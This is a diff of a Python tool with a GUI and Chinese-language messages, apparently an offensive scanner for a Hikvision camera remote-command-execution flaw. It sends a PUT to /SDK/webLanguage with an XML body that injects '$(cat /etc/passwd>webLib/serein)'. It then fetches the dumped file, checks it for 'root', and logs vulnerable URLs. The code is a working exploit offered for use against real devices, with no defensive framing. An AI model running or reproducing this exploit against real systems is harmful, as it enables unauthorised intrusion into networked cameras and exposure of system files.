@@ -11,15 +11,13 @@ def get_hkvurl():
 
 def hkv_rce(address):
     try:
-        url = address + "/SDK/webLanguage"
-        newurl = url.split('//')[1].split('/')[0]
+        url1 = address + "/SDK/webLanguage"
+        newurl = url1.split('//')[1].split('/')[0]
         if ":" not in str(newurl):
             pass
         else:
             host = newurl.split(':')[0]
             port = newurl.split(':')[1]
-            hkv_text.insert(END, chars="【~~~】开始扫描url：" + url + "\n")
-            hkv_text.see(END)
             headers = {
                 "host": f'{host}:{port}',
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -29,29 +27,21 @@ def hkv_rce(address):
                 'Accept-Encoding': 'gzip, deflate',
                 'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8'
             }
-            data = r"""<?xml version="1.0" encoding="UTF-8"?><language>$(ls>webLib/test123)</language>"""
-            resp = requests.put(url, headers=headers, data=data, timeout=3)
-            # hkv_text.insert(END, chars="-"*50 + "\n" + resp.text + "-"*50 + "\n")
-            # hkv_text.see(END)
-            if resp.status_code == 200:
-                hkv_text.insert(END, chars="【O(∩_∩)O】存在漏洞并且可以执行！存在漏洞的url为：" + url + "\n")
+            data = r"""<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd>webLib/serein)</language>"""
+            resp1 = requests.put(url1, headers=headers, data=data, timeout=3,verify=False)
+            url2 = address + "/serein"
+            resp2 = requests.get(url2,timeout=3,verify=False)
+            if "root" in resp2.text:
+                hkv_text.insert(END, chars="【O(∩_∩)O】存在漏洞并且可以执行！存在漏洞的url为：" + url2 + "\n")
                 hkv_text.see(END)
                 with open("存在海康威视RCE漏洞的url.txt", "a+") as m:
-                    m.write(url + "\n")
-            elif resp.status_code == 401:
-                hkv_text.insert(END, chars="【×××】不存在漏洞！url为：" + url + "\n")
-                hkv_text.see(END)
+                    m.write(url2 + "\n")
             else:
-                hkv_text.insert(END, chars="【×××】可能存在漏洞！url为：" + url + "\n")
+                hkv_text.insert(END, chars="【×××】不存在漏洞！url为：" + url2 + "\n")
                 hkv_text.see(END)
-                with open("可能存在海康威视RCE漏洞的url.txt", "a+") as m:
-                    m.write(url + "\n")
     except Exception as e:
-        hkv_text.insert(END, chars=str(e) + "\n")
+        hkv_text.insert(END, chars="【×××】出错了！报错内容为：" + str(e) + "\n")
         hkv_text.see(END)
-        hkv_text.insert(END, chars="【###】检测完毕！" + "\n")
-        hkv_text.see(END)
-
 
 def hkv_rce_gui():
     hkv_gui = tk.Tk()
